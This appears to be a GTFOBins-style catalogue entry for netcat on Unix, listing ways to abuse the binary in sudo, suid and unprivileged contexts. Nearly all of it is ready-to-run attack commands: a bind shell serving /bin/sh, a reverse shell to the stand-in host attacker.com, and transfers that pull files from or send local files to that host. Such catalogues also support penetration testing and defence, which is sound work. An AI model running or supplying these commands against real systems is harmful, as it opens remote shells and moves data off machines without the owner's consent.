---
type: gtfobin
name: nc
platform: Unix
functions: [bind-shell, download, reverse-shell, upload]
tags: [gtfobin, unix, lotl]
---

# nc

## bind-shell

```bash
nc -l -p 12345 -e /bin/sh
```
_This only works with netcat traditional._
**Contexts:** sudo, suid, unprivileged

## download

```bash
nc -l -p 12345 >/path/to/output-file
```
_The file is actually written by the invoking shell._
**Contexts:** sudo, suid, unprivileged

```bash
nc attacker.com 12345 >/path/to/output-file
```
_The file is actually written by the invoking shell._
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
nc -e /bin/sh attacker.com 12345
```
_This only works with netcat traditional._
**Contexts:** sudo, suid, unprivileged

## upload

```bash
nc -l -p 12345 </path/to/input-file
```
_The file is actually read by the invoking shell._
**Contexts:** sudo, suid, unprivileged

```bash
nc attacker.com 12345 </path/to/input-file
```
_The file is actually read by the invoking shell._
**Contexts:** sudo, suid, unprivileged
